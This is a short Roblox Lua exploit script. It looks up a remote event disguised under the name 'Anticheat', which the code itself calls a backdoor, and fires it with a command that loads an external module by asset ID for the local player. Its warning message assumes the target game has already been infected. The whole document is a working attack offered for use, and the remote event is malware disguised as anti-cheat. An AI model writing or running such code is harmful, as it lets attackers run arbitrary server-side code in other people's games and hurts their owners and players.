-- i like my cheese drippy bro
local moduleID = 970596902
local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")

if backdoor then
    local executeScript = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
    backdoor:FireServer(executeScript)
else
    warn("clibackdoor not found, did you infect the game?")
end
